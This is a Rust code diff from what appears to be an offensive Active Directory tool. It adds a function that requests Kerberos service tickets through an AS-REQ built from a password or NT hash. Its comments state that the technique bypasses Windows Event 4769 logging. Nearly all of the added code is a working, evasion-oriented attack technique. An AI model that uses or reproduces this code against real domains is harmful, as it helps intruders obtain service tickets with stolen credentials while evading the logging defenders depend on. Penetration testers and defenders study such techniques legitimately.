@@ -187,7 +187,7 @@ async fn kdc_recv(stream: &mut TcpStream) -> Result<Vec<u8>> {
 
 /// Connect to KDC, send request, receive response
 /// Tries UDP first for small messages, falls back to TCP on failure.
-async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
+pub(crate) async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
     kdc_exchange_tcp(dc_ip, request_bytes).await
 }
 
@@ -2282,6 +2282,131 @@ pub async fn request_service_ticket_ex(
         request_service_ticket_fast(dc_ip, tgt, target_spn).await
     } else {
         request_service_ticket(dc_ip, tgt, target_spn).await
+    }
+}
+
+// -----------------------------------------------------------
+//  AS-Requested Service Tickets (Bypasses Event 4769)
+// -----------------------------------------------------------
+
+/// Request a service ticket via AS-REQ instead of TGS-REQ.
+///
+/// This bypasses Event 4769 (Kerberos Service Ticket Operations) logging
+/// because the KDC only logs TGS-REQ operations, not AS-REQ.
+///
+/// Reference: https://github.com/CCraneOBU/as-req-st (Charlie Clark, 2022)
+pub async fn request_service_ticket_via_as_req(
+    dc_ip: &str,
+    domain: &str,
+    target_spn: &str,
+    secret: &str,
+    use_hash: bool,
+) -> Result<TicketGrantingData> {
+    let realm = normalize_realm(domain);
+    let spn = normalize_username(target_spn);
+    info!("AS-REQ ST: requesting service ticket for {spn} via AS-REQ (bypasses Event 4769)");
+    let account_name = spn.split('/').next().unwrap_or(spn);
+    let etypes: Vec<i32> = vec![ETYPE_AES256_CTS, ETYPE_AES128_CTS, ETYPE_RC4_HMAC];
+
+    let key = if use_hash {
+        hex::decode(secret).unwrap_or_else(|_| secret.as_bytes().to_vec())
+    } else {
+        crate::proto::ntlm::nt_hash(secret)
+    };
+
+    let pa_timestamp = build_pa_enc_timestamp(&key, ETYPE_RC4_HMAC)?;
+    let pa_pac = build_pa_pac_request(true);
+    let now = Utc::now();
+    let till = now + chrono::Duration::hours(10);
+
+    let sname = if spn.contains('/') {
+        let parts: Vec<&str> = spn.splitn(2, '/').collect();
+        let service = parts[0].to_string();
+        let host = parts[1].split(':').next().unwrap_or(parts[1]).to_string();
+        Some(PrincipalName {
+            name_type: NT_SRV_INST,
+            name_string: vec![service, host],
+        })
+    } else {
+        Some(PrincipalName {
+            name_type: NT_PRINCIPAL,
+            name_string: vec![spn.to_string()],
+        })
+    };
+
+    let req_body = KdcReqBody {
+        kdc_options: KerberosFlags { flags: 0x40000000 },
+        cname: Some(PrincipalName {
+            name_type: NT_PRINCIPAL,
+            name_string: vec![account_name.to_string()],
+        }),
+        realm: realm.clone(),
+        sname,
+        from: None,
+        till: KerberosTime::from(till),
+        rtime: Some(KerberosTime::from(till)),
+        nonce: rand::random::<u32>(),
+        etypes: etypes.to_vec(),
+        addresses: None,
+        enc_authorization_data: None,
+        additional_tickets: None,
+    };
+
+    let as_req = AsReq {
+        pvno: 5,
+        msg_type: 10,
+        padata: Some(vec![pa_timestamp, pa_pac]),
+        req_body,
+    };
+
+    let as_req_bytes = as_req.build();
+    let response = kdc_exchange(dc_ip, &as_req_bytes).await?;
+
+    match AsRep::parse(&response) {
+        Ok((_, as_rep)) => {
+            let cipher = new_kerberos_cipher(ETYPE_RC4_HMAC)
+                .map_err(|e| OverthroneError::Kerberos(format!("AS-REQ ST: cipher init: {e}")))?;
+
+            let decrypted = cipher
+                .decrypt(&as_rep.enc_part.cipher, 3, &key)
+                .map_err(|e| {
+                    OverthroneError::Decryption(format!("AS-REQ ST: decrypt failed: {e}"))
+                })?;
+
+            let (_, enc_as_rep_part) =
+                kerberos_asn1::EncAsRepPart::parse(&decrypted).map_err(|e| {
+                    OverthroneError::Kerberos(format!("AS-REQ ST: parse EncAsRepPart: {e}"))
+                })?;
+
+            let session_key = enc_as_rep_part.key.keyvalue.clone();
+            let session_etype = enc_as_rep_part.key.keytype;
+
+            Ok(TicketGrantingData {
+                ticket: as_rep.ticket,
+                session_key,
+                session_key_etype: session_etype,
+                client_principal: account_name.to_string(),
+                client_realm: realm,
+                end_time: Some(enc_as_rep_part.endtime),
+            })
+        }
+        Err(_) => {
+            if let Ok((_, krb_error)) = kerberos_asn1::KrbError::parse(&response) {
+                let e_text = krb_error
+                    .e_text
+                    .as_deref()
+                    .unwrap_or("KDC error without text")
+                    .to_string();
+                Err(OverthroneError::Kerberos(format!(
+                    "AS-REQ ST: KDC error {}: {}",
+                    krb_error.error_code, e_text
+                )))
+            } else {
+                Err(OverthroneError::Kerberos(
+                    "AS-REQ ST: failed to parse KDC response".to_string(),
+                ))
+            }
+        }
     }
 }
 
